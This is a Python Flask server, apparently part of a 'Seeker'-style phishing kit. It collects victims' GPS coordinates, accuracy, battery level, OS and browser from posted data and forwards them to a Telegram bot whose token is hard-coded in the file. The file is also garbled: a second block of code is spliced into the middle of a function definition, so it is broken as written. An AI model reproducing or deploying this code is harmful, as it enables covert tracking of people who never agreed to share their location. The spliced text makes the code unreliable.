import requests
from flask import Flask, request

app = Flask(__name__)

# بيانات البوت واليوزر
TG_TOKEN = "7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y"
CHAT_ID = "7961048427"
TG_API = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"

@app.route("/")
def index():
    return "Seeker is running!"

@app.route("/location", methods=["POST"])
def location(import requests

def send_to_telegram(message):
    bot_token = '7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y'
    chat_id = '7961048427'
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {'chat_id': chat_id, 'text': message}
    requests.post(url, data=payload)

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    location_data = f"""📍 موقع جديد:

🔸 Lat: {data.get('lat')}
🔹 Lon: {data.get('lon')}
🕒 Time: {data.get('timestamp')}
📶 Accuracy: {data.get('accuracy')}m
🔋 Battery: {data.get('battery')}%
📱 OS: {data.get('os')} | {data.get('browser')}
"""
    print(location_data)
    send_to_telegram(location_data)
    return 'OK'):
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    msg = f"📍 موقع جديد\nخط العرض: {lat}\nخط الطول: {lon}"
    print("🚀 Sending to Telegram:", msg)
    response = requests.get(TG_API, params={"chat_id": CHAT_ID, "text": msg})
    print("📩 Telegram response:", response.text)
    return {"status": "تم الاستلام"}
